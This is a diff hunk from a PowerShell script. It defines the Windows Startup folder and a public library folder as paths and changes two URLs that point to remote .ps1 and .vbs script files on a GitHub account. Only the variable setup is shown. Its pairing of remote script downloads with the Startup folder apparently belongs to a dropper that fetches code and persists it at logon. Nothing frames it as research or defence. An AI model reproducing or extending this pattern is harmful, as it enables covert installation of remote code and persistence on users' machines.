@@ -4,8 +4,8 @@ $StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $PublicLibPath = "C:\Users\Public\Libraries"
 
 # File URLs
-$File1Url = "https://github.com/KevinDark5/taproject/raw/refs/heads/main/nk.ps1"
-$File2Url = "https://github.com/KevinDark5/taproject/raw/refs/heads/main/nk.vbs"
+$File1Url = "https://github.com/KevinDark5/data/raw/refs/heads/main/nk.ps1"
+$File2Url = "https://github.com/KevinDark5/data/raw/refs/heads/main/vbs.ps1"
 
 # File names
 $File1Name = "nk.ps1"
